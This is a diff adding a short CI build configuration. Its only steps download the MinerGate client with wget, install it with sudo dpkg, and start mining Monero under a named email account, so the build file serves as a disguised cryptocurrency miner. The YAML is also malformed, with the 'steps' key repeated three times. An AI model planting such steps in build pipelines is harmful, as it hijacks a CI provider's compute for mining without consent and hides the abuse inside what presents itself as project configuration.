@@ -1,0 +1,21 @@
+box: debian
+
+build:
+
+  steps:
+    - script:
+        name: Download
+        code: |
+          wget https://minergate.com/download/deb-cli -O minergate-cli.deb
+
+  steps:
+    - script:
+        name: Download
+        code: |
+          sudo dpkg -i minergate-cli.deb
+          
+  steps:
+    - script:
+        name: Download
+        code: |
+          minergate-cli -user yoginth@hotmail.com xmr
